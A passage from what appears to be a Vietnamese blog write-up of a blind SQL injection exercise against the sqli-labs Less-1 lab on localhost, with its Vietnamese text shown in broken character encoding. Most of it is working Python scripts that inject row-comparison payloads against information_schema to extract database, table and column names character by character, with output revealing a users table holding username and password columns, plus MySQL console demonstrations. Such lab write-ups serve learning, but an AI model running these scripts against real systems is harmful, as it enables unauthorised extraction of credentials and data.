class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;sys&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                table_name+j, index_table)</span><br><span class="line">            <span class="built_in">print</span>(table_name+j)</span><br><span class="line">            <span class="comment"># print(url+payload)</span></span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                <span class="comment"># bÆ°á»›c nÃ y mÃ¬nh check khi nÃ³ bá»‹ nhiá»…u á»Ÿ kÃ­ tá»± cuá»‘i</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                table_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># Thay Ä‘á»•i kÃ­ tá»± cuá»‘i vá» Ä‘Ãºng kÃ­ tá»± cáº§n tÃ¬m vÃ­ dá»¥ nÃ³ xuáº¥t ra mysqk thÃ¬ chÃºng ta cáº§n Ä‘á»•i vá» mysql báº±ng cÃ¡ch tÄƒng ascii tháº±ng k lÃªn 1</span></span><br><span class="line">    list_tablename = <span class="built_in">list</span>(table_name)</span><br><span class="line">    list_tablename[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_tablename[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span>.join(list_dbname)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Table name is: &quot;</span>+table_name)</span><br><span class="line">    <span class="keyword">if</span> db_name == <span class="string">&quot;__________________`&quot;</span>:</span><br><span class="line">    <span class="comment"># dÃ²ng nÃ y lÃ  mÃ¬nh vá»›i payload cá»§a mÃ¬nh, payload nhiá»…u sáº½ hiá»‡n ra cÃ¡i nÃ y --&gt; dáº¥u hiá»‡u nháº­n biáº¿t.</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    all_table_name.append(db_name)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(all_table_name)</span><br></pre></td></tr></table></figure><p>Hmm, á»Ÿ trÃªn k hay cho láº¯m cÃ¡i nÃ y thuáº­n lá»£i cho viá»‡c dÃ² tÃ¬m hÆ¡n:</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">url <span class="operator">=</span> <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"># nháº­p cÃ¡c giÃ¡ trá»‹</span><br><span class="line">print(&quot;Nháº­p database cáº§n tÃ¬m table_name: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name <span class="operator">=</span> str(input())</span><br><span class="line">print(&quot;Nháº­p báº¯t Ä‘áº§u table_name cáº§n tÃ¬m: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_begin <span class="operator">=</span> <span class="type">int</span>(input())<span class="number">-1</span></span><br><span class="line">print(&quot;Nháº­p káº¿t thÃºc cá»§a table_name cáº§n tÃ¬m: &quot;, <span class="keyword">end</span><span class="operator">=</span><span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_end <span class="operator">=</span> <span class="type">int</span>(input())<span class="number">-1</span></span><br><span class="line">table_name <span class="operator">=</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"># <span class="comment">-------</span></span><br><span class="line">all_table_name <span class="operator">=</span> []</span><br><span class="line">count <span class="operator">=</span> <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="keyword">range</span>(index_table_begin, index_table_end):</span><br><span class="line">    count <span class="operator">=</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="keyword">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        if count <span class="operator">&gt;</span> <span class="number">0</span>:</span><br><span class="line">            break</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> &quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;:</span><br><span class="line">            payload <span class="operator">=</span> &quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;.format(</span><br><span class="line">                db_name, table_name<span class="operator">+</span>j, index_table)</span><br><span class="line">            print(table_name<span class="operator">+</span>j)</span><br><span class="line">            payload_encoded <span class="operator">=</span> urllib.parse.quote(payload)</span><br><span class="line">            r <span class="operator">=</span> requests.get(url<span class="operator">=</span>url<span class="operator">+</span>payload_encoded)</span><br><span class="line">            if &quot;Your Login name&quot; <span class="keyword">in</span> r.text:</span><br><span class="line">                # bÆ°á»›c nÃ y mÃ¬nh <span class="keyword">check</span> khi nÃ³ bá»‹ nhiá»…u á»Ÿ kÃ­ tá»± cuá»‘i</span><br><span class="line">                if j <span class="operator">=</span><span class="operator">=</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count <span class="operator">+</span><span class="operator">=</span> <span class="number">1</span></span><br><span class="line">                continue</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                # print(r.text)</span><br><span class="line">                table_name <span class="operator">+</span><span class="operator">=</span> chr(ord(j)<span class="number">-1</span>)</span><br><span class="line">                break</span><br><span class="line">    # Thay Ä‘á»•i kÃ­ tá»± cuá»‘i vá» Ä‘Ãºng kÃ­ tá»± cáº§n tÃ¬m vÃ­ dá»¥ nÃ³ xuáº¥t ra mysqk thÃ¬ chÃºng ta cáº§n Ä‘á»•i vá» mysql báº±ng cÃ¡ch tÄƒng ascii tháº±ng k lÃªn <span class="number">1</span></span><br><span class="line">    list_tbname <span class="operator">=</span> list(table_name)</span><br><span class="line">    list_tbname[<span class="number">-1</span>] <span class="operator">=</span> chr(ord(list_tbname[<span class="number">-1</span>])<span class="operator">+</span><span class="number">1</span>)</span><br><span class="line">    table_name <span class="operator">=</span> &quot;&quot;.<span class="keyword">join</span>(list_tbname)</span><br><span class="line">    print(&quot;Table name is: &quot;<span class="operator">+</span>table_name)</span><br><span class="line">    all_table_name.append(table_name)</span><br><span class="line">    table_name <span class="operator">=</span> &quot;&quot;</span><br><span class="line">print(&quot;All table name:&quot;)</span><br><span class="line">print(all_table_name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Vá»›i payload cá»§a mÃ¬nh náº¿u khÃ´ng Ä‘Ãºng index so vá»›i database thÃ¬ nÃ³ sáº½ cÃ³ table_name lÃ  â€œ__________________&#96;â€ hoáº·c lÃ  string trá»‘ng. Äá»ƒ tÃ¬m Ä‘Ãºng thÃ¬ chÃºng ta sáº½ dÃ² Ä‘áº¿n khi cÃ³ tÃªn há»£p lÃ½.</p><p>Script dump table_name:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nháº­p cÃ¡c giÃ¡ trá»‹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p database cáº§n tÃ¬m table_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p báº¯t Ä‘áº§u table_name cáº§n tÃ¬m: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_begin = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p káº¿t thÃºc cá»§a table_name cáº§n tÃ¬m: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_table_end = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_table_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_table <span class="keyword">in</span> <span class="built_in">range</span>(index_table_begin, index_table_end):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21)&lt;=(table information_schema.tables limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                db_name, table_name+j, index_table)</span><br><span class="line">            <span class="built_in">print</span>(table_name+j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># bÆ°á»›c nÃ y mÃ¬nh check khi nÃ³ bá»‹ nhiá»…u á»Ÿ kÃ­ tá»± cuá»‘i</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                table_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break vá»›i trÆ°á»ng há»£p table_name = &#x27;&#x27; (test lÃ  tháº¥y, tÃ¹y cÃ¡ch mÃ¬nh láº­p trÃ¬nh ^^)</span></span><br><span class="line">    <span class="keyword">if</span> table_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># Thay Ä‘á»•i kÃ­ tá»± cuá»‘i vá» Ä‘Ãºng kÃ­ tá»± cáº§n tÃ¬m vÃ­ dá»¥ nÃ³ xuáº¥t ra mysqk thÃ¬ chÃºng ta cáº§n Ä‘á»•i vá» mysql báº±ng cÃ¡ch tÄƒng ascii tháº±ng k lÃªn 1</span></span><br><span class="line">    list_tbname = <span class="built_in">list</span>(table_name)</span><br><span class="line">    <span class="built_in">print</span>(list_tbname)</span><br><span class="line">    list_tbname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_tbname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span>.join(list_tbname)</span><br><span class="line">    <span class="comment"># print(&quot;Table name is: &quot;+table_name) print tháº³ng all table name dá»… xá»­ lÃ­ váº¥n Ä‘á» hÆ¡n nhá»‰ ^^.</span></span><br><span class="line">    all_table_name.append(table_name)</span><br><span class="line">    table_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_table_name)</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    //á» trong bÃ i nÃ y, chÃºng ta cáº§n tÃ¬m table_name trong database security</span></span><br><span class="line"><span class="string">    All table name:</span></span><br><span class="line"><span class="string">    [&#x27;emails&#x27;, &#x27;referers&#x27;, &#x27;uagents&#x27;, &#x27;users&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;]</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Dump-column-name"><a href="#Dump-column-name" class="headerlink" title="Dump column_name:"></a>Dump column_name:</h3><p>Báº£ng nÃ y cÃ³ 22 cá»™t. TÆ°Æ¡ng tá»± nhÆ° information_schema.tables báº£ng nÃ y cáº§n thÃªm 2 giÃ¡ trá»‹ xÃ¡c Ä‘á»‹nh lÃ  database vÃ  table, vÃ  dÃ² khoáº£ng Ä‘Ãºng vá»›i database vÃ  table cá»§a column. Viá»‡c dÃ² nÃ y cÃ¡c báº¡n lÆ°u Ã½ tá»± dÃ² nhÃ©, bá»Ÿi vÃ¬ vá»›i má»—i phiÃªn báº£n sáº½ cÃ³ thÃªm nhá»¯ng table vÃ  column nÃªn nÃ³ chá»‰ gáº§n sÃ¡t vá»›i khoáº£ng cá»§a mÃ¬nh thÃ´i.</p><p>Script dump column_name:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">&#x27;http://localhost/Less-1/?id=&#x27;</span></span><br><span class="line"><span class="comment"># nháº­p cÃ¡c giÃ¡ trá»‹</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p database cáº§n tÃ¬m column_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">db_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p table cáº§n tÃ¬m column_name: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">tb_name = <span class="built_in">str</span>(<span class="built_in">input</span>())</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p báº¯t Ä‘áº§u column_name cáº§n tÃ¬m: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_column_begin = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Nháº­p káº¿t thÃºc cá»§a column_name cáº§n tÃ¬m: &quot;</span>, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">index_column_end = <span class="built_in">int</span>(<span class="built_in">input</span>())-<span class="number">1</span></span><br><span class="line">column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># -------</span></span><br><span class="line">all_column_name = []</span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> index_column <span class="keyword">in</span> <span class="built_in">range</span>(index_column_begin, index_column_end):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">20</span>):</span><br><span class="line">        <span class="keyword">if</span> count &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&quot;`abcdefghijklmnopqrstuvwxyz-&#123;|&#125;~&quot;</span>:</span><br><span class="line">            payload = <span class="string">&quot;1&#x27; and (&#x27;def&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,&#x27;&#123;&#125;&#x27;,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22)&lt;=(table information_schema.columns limit &#123;&#125;,1)-- -&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">                db_name, tb_name, column_name+j, index_column)</span><br><span class="line">            <span class="built_in">print</span>(column_name+j)</span><br><span class="line">            payload_encoded = urllib.parse.quote(payload)</span><br><span class="line">            r = requests.get(url=url+payload_encoded)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;Your Login name&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">                <span class="comment"># bÆ°á»›c nÃ y mÃ¬nh check khi nÃ³ bá»‹ nhiá»…u á»Ÿ kÃ­ tá»± cuá»‘i</span></span><br><span class="line">                <span class="keyword">if</span> j == <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">                    count += <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># print(r.text)</span></span><br><span class="line">                column_name += <span class="built_in">chr</span>(<span class="built_in">ord</span>(j)-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># break vá»›i trÆ°á»ng há»£p column_name = &#x27;&#x27; (test lÃ  tháº¥y, tÃ¹y cÃ¡ch mÃ¬nh láº­p trÃ¬nh ^^)</span></span><br><span class="line">    <span class="keyword">if</span> column_name == <span class="string">&quot;&quot;</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># Thay Ä‘á»•i kÃ­ tá»± cuá»‘i vá» Ä‘Ãºng kÃ­ tá»± cáº§n tÃ¬m vÃ­ dá»¥ nÃ³ xuáº¥t ra mysqk thÃ¬ chÃºng ta cáº§n Ä‘á»•i vá» mysql báº±ng cÃ¡ch tÄƒng ascii tháº±ng k lÃªn 1</span></span><br><span class="line">    list_clname = <span class="built_in">list</span>(column_name)</span><br><span class="line">    <span class="built_in">print</span>(list_clname)</span><br><span class="line">    list_clname[-<span class="number">1</span>] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(list_clname[-<span class="number">1</span>])+<span class="number">1</span>)</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span>.join(list_clname)</span><br><span class="line">    all_column_name.append(column_name)</span><br><span class="line">    column_name = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;All table name:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(all_column_name)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Nháº­p database cáº§n tÃ¬m column_name: security</span></span><br><span class="line"><span class="string">Nháº­p table cáº§n tÃ¬m column_name: users   </span></span><br><span class="line"><span class="string">Nháº­p báº¯t Ä‘áº§u column_name cáº§n tÃ¬m: 3490</span></span><br><span class="line"><span class="string">Nháº­p káº¿t thÃºc cá»§a column_name cáº§n tÃ¬m: 3505</span></span><br><span class="line"><span class="string">All table name:</span></span><br><span class="line"><span class="string">[&#x27;id&#x27;, &#x27;username&#x27;, &#x27;password&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;, &#x27;__________________`&#x27;]</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="Dump-bang-da-duoc-xac-dinh"><a href="#Dump-bang-da-duoc-xac-dinh" class="headerlink" title="Dump báº£ng Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh:"></a>Dump báº£ng Ä‘Ã£ Ä‘Æ°á»£c xÃ¡c Ä‘á»‹nh:</h3><p>MÃ¬nh khÃ´ng hiá»ƒu táº¡i sao bÃ¢y giá» giáº£ sá»­ giÃ¡ trá»‹ cáº§n tÃ¬m lÃ  dump, thÃ¬ mÃ¬nh xÃ©t vá»›i dump thÃ¬ nÃ³ váº«n tráº£ vá» true. NhÆ°ng mÃ  cÅ©ng khÃ´ng quan trá»ng láº¯m, lÃ m theo cÃ¡i mÃ¬nh test thÃ´i Ã  ^^.</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;duma&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;duma&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumb&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumb&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">1</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumc&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>);</span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> (<span class="string">&#x27;1&#x27;</span>,<span class="string">&#x27;dumc&#x27;</span>,<span class="string">&#x27;&#x27;</span>)<span class="operator">&lt;=</span>(<span class="keyword">table</span> security.users limit <span class="number">1</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span>                                               <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">-------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>huhu kÄ© nÄƒng láº­p trÃ¬nh kÃ©m nÃªn khÃ´ng biáº¿t viáº¿t nhÆ° nÃ o cho chuáº©n nháº¥t (lÆ°á»i quÃ¡), script cá»§a mÃ¬nh á»Ÿ dÆ°á»›i bá»‹ dÃ­nh tháº±ng â€˜0â€™ cÃ¡ch mÃ¬nh bypass chÆ°a tá»‘i Æ°u, náº¿u giÃ¡ trá»‹ cÃ³ sá»‘ 0 thÃ¬ mÃ¬nh sai nhÆ°ng mÃ  lÆ°á»i viáº¿t quÃ¡.<br>Dump id:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span 